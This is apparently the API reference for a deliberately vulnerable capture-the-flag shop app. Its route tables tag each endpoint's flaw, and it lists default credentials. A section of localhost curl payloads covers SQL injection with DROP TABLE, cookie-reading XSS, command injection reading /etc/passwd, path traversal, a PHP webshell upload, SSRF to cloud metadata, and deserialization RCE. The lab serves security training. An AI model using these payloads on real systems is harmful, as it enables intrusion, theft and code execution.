# VulnNode-CTF v2.0 - API Routes Reference

**Base URL:** `http://localhost:3000`

---

## 🔓 Public Routes (No Authentication)

### System Information

| Method | Endpoint | Description | Vulnerability |
|--------|----------|-------------|---------------|
| GET | `/health` | Health check | Information disclosure |
| GET | `/serverinfo` | Server details | **CRITICAL** - Exposes env vars |

### Products

| Method | Endpoint | Description | Vulnerability |
|--------|----------|-------------|---------------|
| GET | `/api/products` | List all products | SQL injection in `?search=` |
| GET | `/api/products/:id` | Get product details | No hidden product filter |
| GET | `/api/products/slug/:slug` | Get by slug | SQL injection |
| POST | `/api/products/search` | Advanced search | SQL injection in filters |
| GET | `/api/products/:id/related` | Related products | - |
| GET | `/api/products/featured/list` | Featured products | - |
| GET | `/api/products/category/:id` | By category | - |
| POST | `/api/products/compare` | Compare products | No rate limit |

### Orders (No Auth!)

| Method | Endpoint | Description | Vulnerability |
|--------|----------|-------------|---------------|
| GET | `/checkout/confirmation/:order_number` | View order | **IDOR** - No auth required |

---

## 🔐 Authenticated Routes (Login Required)

### Authentication

| Method | Endpoint | Description | Body |
|--------|----------|-------------|------|
| POST | `/auth/login` | Login | `{"username":"", "password":""}` |
| POST | `/auth/register` | Register | `{"username":"", "email":"", "password":""}` |
| GET | `/auth/logout` | Logout | - |

**Default Credentials:**
- Admin: `admin` / `admin123`
- User: `alice` / `alice123`, `bob` / `bob123`

### Shopping Cart

| Method | Endpoint | Description | Vulnerability |
|--------|----------|-------------|---------------|
| GET | `/api/cart` | View cart | - |
| POST | `/api/cart/add` | Add to cart | Negative quantities allowed |
| POST | `/api/cart/update` | Update quantity | **IDOR** - No ownership check |
| POST | `/api/cart/remove` | Remove item | **IDOR** - No ownership check |
| POST | `/api/cart/clear` | Clear cart | - |
| GET | `/api/cart/summary` | Get summary | Client-side calculation |
| POST | `/api/cart/apply-coupon` | Apply coupon | **SQL Injection** |
| POST | `/api/cart/remove-coupon` | Remove coupon | - |
| POST | `/api/cart/merge` | Merge guest cart | No validation |

### Checkout

| Method | Endpoint | Description | Vulnerability |
|--------|----------|-------------|---------------|
| GET | `/api/checkout` | Checkout page | - |
| POST | `/api/checkout/validate` | Validate stock | Weak validation |
| POST | `/api/checkout/process` | Create order | **Trusts client prices** |
| POST | `/api/checkout/generate-invoice` | Generate invoice | **SSRF** vulnerability |
| POST | `/api/checkout/apply-promo` | Apply promo | SQL injection |
| POST | `/api/checkout/update-total` | Update total | **No auth/validation** |
| POST | `/api/checkout/calculate-tax` | Calculate tax | Integer overflow |

### Product Reviews

| Method | Endpoint | Description | Vulnerability |
|--------|----------|-------------|---------------|
| POST | `/api/products/:id/review` | Add review | **Stored XSS** |
| PUT | `/api/products/review/:id` | Update review | **IDOR** - No ownership check |
| DELETE | `/api/products/review/:id` | Delete review | **IDOR** - No ownership check |
| POST | `/api/products/review/:id/helpful` | Mark helpful | Unlimited votes |

### Support Tickets

| Method | Endpoint | Description | Vulnerability |
|--------|----------|-------------|---------------|
| POST | `/api/support/create` | Create ticket | **Stored XSS** |
| GET | `/api/support/my-tickets` | My tickets | - |
| GET | `/api/support/:id` | View ticket | **IDOR** - View any ticket |
| POST | `/api/support/:id/message` | Add message | **XSS** + No ownership check |
| POST | `/api/support/:id/close` | Close ticket | **IDOR** - Close any ticket |
| DELETE | `/api/support/:id` | Delete ticket | **IDOR** - Delete any ticket |

### File Upload

| Method | Endpoint | Description | Vulnerability |
|--------|----------|-------------|---------------|
| POST | `/api/upload/avatar` | Upload avatar | **Unrestricted file upload** |
| POST | `/api/upload/product-image` | Upload product image | **Path traversal** |

### User Management

| Method | Endpoint | Description | Vulnerability |
|--------|----------|-------------|---------------|
| PUT | `/api/products/:id` | Update product | **Mass assignment** - No admin check |

---

## 👑 Admin Routes (Admin Role Required)

### Admin Panel

| Method | Endpoint | Description | Vulnerability |
|--------|----------|-------------|---------------|
| GET | `/api/admin/users` | List users | - |
| GET | `/api/admin/users/:id` | Get user | - |
| POST | `/api/admin/users/:id` | Update user | **Mass assignment** |
| DELETE | `/api/admin/users/:id` | Delete user | - |
| GET | `/api/admin/users/search` | Search users | **SQL Injection** |
| POST | `/api/admin/health` | Health check | **Command Injection** |
| POST | `/api/admin/system-info` | System info | **Command Injection** |
| GET | `/api/admin/logs/:filename` | View logs | **LFI** - Path traversal |
| POST | `/api/admin/deserialize` | Deserialize data | **RCE** via deserialization |

### Support Admin

| Method | Endpoint | Description | Vulnerability |
|--------|----------|-------------|---------------|
| GET | `/api/support/admin/all` | All tickets | - |
| POST | `/api/support/:id/assign` | Assign ticket | - |
| POST | `/api/support/:id/reply` | Reply to ticket | **XSS** |
| GET | `/api/support/admin/logs/:filename` | View logs | **LFI** |
| POST | `/api/support/admin/export` | Export tickets | **XXE** vulnerability |
| GET | `/api/support/admin/search` | Search tickets | **SQL Injection** |

---

## 🎯 Exploitation Examples

### 1. SQL Injection (Products Search)

```bash
# Basic injection
curl "http://localhost:3000/api/products?search=test'+OR+'1'='1"

# Union-based
curl "http://localhost:3000/api/products?search=test'+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--"

# ORDER BY injection
curl "http://localhost:3000/api/products?sort=price+DESC;+DROP+TABLE+users--"
```

### 2. SQL Injection (Coupon Code)

```bash
# Get all coupons
curl -X POST http://localhost:3000/api/cart/apply-coupon \
  -H "Content-Type: application/json" \
  -d '{"coupon_code": "' OR '1'='1"}'

# Extract data
curl -X POST http://localhost:3000/api/cart/apply-coupon \
  -H "Content-Type: application/json" \
  -d '{"coupon_code": "' UNION SELECT flag,2,3,4,5,6,7,8,9,10,11,12,13,14 FROM secrets--"}'
```

### 3. IDOR (View Any Order)

```bash
# No authentication required!
curl http://localhost:3000/checkout/confirmation/ORD-2024-00001
curl http://localhost:3000/checkout/confirmation/ORD-2024-00002
curl http://localhost:3000/checkout/confirmation/ORD-2024-00003
```

### 4. IDOR (Support Tickets)

```bash
# Login as any user
curl -X POST http://localhost:3000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' \
  -c cookies.txt

# View any ticket
curl http://localhost:3000/api/support/1 -b cookies.txt
curl http://localhost:3000/api/support/2 -b cookies.txt
curl http://localhost:3000/api/support/3 -b cookies.txt
```

### 5. Stored XSS (Product Review)

```bash
# Login
curl -X POST http://localhost:3000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' \
  -c cookies.txt

# Post XSS payload
curl -X POST http://localhost:3000/api/products/1/review \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"rating":5,"title":"Great","comment":"<script>alert(document.cookie)</script>"}'
```

### 6. Stored XSS (Support Ticket)

```bash
# Login
curl -X POST http://localhost:3000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' \
  -c cookies.txt

# Create ticket with XSS
curl -X POST http://localhost:3000/api/support/create \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"subject":"<script>alert(1)</script>","message":"Help","category":"general"}'
```

### 7. Price Manipulation

```bash
# Login
curl -X POST http://localhost:3000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' \
  -c cookies.txt

# Add expensive item
curl -X POST http://localhost:3000/api/cart/add \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"product_id":1,"quantity":1}'

# Checkout with $0.01 total (instead of $999.99)
curl -X POST http://localhost:3000/api/checkout/process \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"subtotal":999.99,"discount":0,"shipping_cost":0,"tax":0,"total":0.01,"payment_method":"credit_card","card_token":"fake","shipping_address_id":1,"billing_address_id":1}'
```

### 8. Negative Quantity Exploit

```bash
# Login
curl -X POST http://localhost:3000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' \
  -c cookies.txt

# Add negative quantity to get money
curl -X POST http://localhost:3000/api/cart/add \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"product_id":1,"quantity":-10}'
```

### 9. SSRF (Invoice Generation)

```bash
# Login
curl -X POST http://localhost:3000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' \
  -c cookies.txt

# Access AWS metadata
curl -X POST http://localhost:3000/api/checkout/generate-invoice \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"order_id":1,"template_url":"http://169.254.169.254/latest/meta-data/"}'

# Internal port scan
curl -X POST http://localhost:3000/api/checkout/generate-invoice \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"order_id":1,"template_url":"http://localhost:22/"}'
```

### 10. Command Injection (Admin)

```bash
# Login as admin
curl -X POST http://localhost:3000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}' \
  -c admin_cookies.txt

# Execute commands
curl -X POST http://localhost:3000/api/admin/health \
  -H "Content-Type: application/json" \
  -b admin_cookies.txt \
  -d '{"service":"ping","target":"8.8.8.8; whoami"}'

# Read /etc/passwd
curl -X POST http://localhost:3000/api/admin/health \
  -H "Content-Type: application/json" \
  -b admin_cookies.txt \
  -d '{"service":"ping","target":"8.8.8.8; cat /etc/passwd"}'
```

### 11. LFI (Admin Logs)

```bash
# Login as admin
curl -X POST http://localhost:3000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}' \
  -c admin_cookies.txt

# Read /etc/passwd
curl "http://localhost:3000/api/support/admin/logs/../../../../etc/passwd" \
  -b admin_cookies.txt

# Read application files
curl "http://localhost:3000/api/support/admin/logs/../../../database/init_db_v2.js" \
  -b admin_cookies.txt
```

### 12. File Upload (WebShell)

```bash
# Login
curl -X POST http://localhost:3000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' \
  -c cookies.txt

# Create webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload
curl -X POST http://localhost:3000/api/upload/avatar \
  -b cookies.txt \
  -F "avatar=@shell.php"

# Execute (if PHP installed)
curl "http://localhost:3000/uploads/avatars/shell.php?cmd=whoami"
```

### 13. Insecure Deserialization (RCE)

```bash
# Login as admin
curl -X POST http://localhost:3000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}' \
  -c admin_cookies.txt

# Send malicious serialized object
curl -X POST http://localhost:3000/api/admin/deserialize \
  -H "Content-Type: application/json" \
  -b admin_cookies.txt \
  -d '{"data":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami', function(err,stdout){console.log(stdout)});}()"}'
```

---

## 📊 Summary

- **Total Endpoints:** 60+
- **Public (No Auth):** 12
- **User (Auth Required):** 30+
- **Admin (Admin Role):** 18+
- **Vulnerable Endpoints:** 50+

---

## 🎓 Learning Path

1. **Beginner:** Start with IDOR and information disclosure
2. **Intermediate:** SQL injection and XSS
3. **Advanced:** SSRF, command injection, LFI
4. **Expert:** Deserialization RCE, exploitation chains

---

**Last Updated:** December 27, 2025
**Version:** 2.0
**Status:** Active Development